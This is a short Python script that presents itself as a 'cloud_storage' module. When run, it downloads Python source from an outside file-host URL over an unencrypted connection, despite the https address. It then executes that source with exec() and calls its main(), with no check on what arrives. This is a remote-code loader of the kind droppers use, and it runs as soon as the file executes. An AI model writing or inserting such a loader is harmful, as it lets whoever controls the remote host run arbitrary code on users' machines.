import sys
import types
import http.client
from urllib.parse import urlparse

def get_url():
    return "https://upload.filehost.com/storage/functions.py"

def get_source_code(url):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
    conn.request("GET", parsed_url.path)
    response = conn.getresponse()
    return response.read().decode('utf-8')

def execute():
    url = get_url()
    module_name = "cloud_storage"

    source = get_source_code(url)
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
